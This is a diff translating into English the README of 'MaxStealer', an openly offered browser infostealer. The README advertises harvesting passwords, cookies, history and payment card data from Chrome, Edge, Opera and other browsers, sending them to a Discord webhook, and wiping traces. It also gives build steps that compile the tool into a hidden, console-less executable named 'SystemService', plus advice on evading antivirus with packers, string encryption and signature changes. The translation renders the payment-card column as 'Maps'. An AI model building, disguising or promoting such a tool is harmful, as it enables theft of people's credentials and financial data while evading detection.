@@ -1,57 +1,57 @@
 # <img src="https://raw.githubusercontent.com/VZXdev/MaxStealer/refs/heads/main/icon.ico" width=40> MaxStealer
 
-> Профессиональный инструмент для сбора данных браузеров с необнаруживаемой работой
+> Professional browser data collection tool with undetectable operation
 
 [![Version](https://img.shields.io/badge/version-1.37-purple)]()
 [![Python](https://img.shields.io/badge/python-3.8%2B-blue)]()
 [![License](https://img.shields.io/badge/license-NDA-red)]()
 
-## ✨ Особенности
-- Сбор паролей, куки, истории и платежных данных
-- Поддержка всех популярных браузеров
-- Автоматическая отправка в Discord
-- Полностью скрытный режим работы
-- Защита от детектирования антивирусами
-- Автоочистка следов
+## ✨ Features
+- Collection of passwords, cookies, history and payment data
+- Support for all popular browsers
+- Automatic sending to Discord
+- Fully stealthy operation mode
+- Protection against detection by antiviruses
+- Auto-cleaning of footprints
 
-## 🌐 Поддерживаемые браузеры
-| Браузер | Пароли | Куки | Карты | История |
-|---------|--------|------|-------|---------|
-| Chrome  | ✔️     | ✔️   | ✔️    | ✔️      |
-| Firefox | ✔️     | ✔️   | ✖️    | ✔️      |
-| Edge    | ✔️     | ✔️   | ✔️    | ✔️      |
-| Opera   | ✔️     | ✔️   | ✔️    | ✔️      |
-| Yandex  | ✔️     | ✔️   | ✖️    | ✔️      |
+## 🌐 Supported browsers
+| Browser | Passwords | Cookies | Maps | History |
+|---------|-----------|---------|------|---------|
+| Chrome  | ✔️        | ✔️     | ✔️   | ✔️     |
+| Firefox | ✔️        | ✔️     | ✖️   | ✔️     |
+| Edge    | ✔️        | ✔️     | ✔️   | ✔️     |
+| Opera   | ✔️        | ✔️     | ✔️   | ✔️     |
+| Yandex  | ✔️        | ✔️     | ✖️   | ✔️     |
 
-## ⚙️ Установка
-# Установите Python 3.8+
+## , Installation
+# Install Python 3.8+
 ```bash
 python --version
 ```
-2. Установите зависимости:
+2. Install the dependencies:
 
 ```bash
 
 pip install pycryptodome browser_cookie3 requests
 ```
-# 🛠 Компиляция в EXE
+# 🛠 Compilation to EXE
 ```bash
 pip install pyinstaller
 ```
-4. Скомпилируйте с настройками скрытности:
+4. Compile with stealth settings:
 ```bash
 pyinstaller --onefile --noconsole --name SystemService --icon=NONE stealer.py
 ```
-# ⚠️ Важные заметки
+# ⚠️ Important notes
 
-## Замените ваш_вебхук в коде на свой Discord Webhook URL
+## Replace your_webhook in the code with your Discord Webhook URL
 
-## Для обхода антивирусов используйте:
+## To bypass antiviruses, use:
 
-1. Упаковщики (VMProtect, Themida)
+1. Packers (VMProtect, Themida)
 
-2. Шифрование строк
+2. String encryption
 
-3. Смена сигнатур
+3. Changing signatures
 
-# Разработчик не несет ответственности за использование
+# The developer is not responsible for the use of
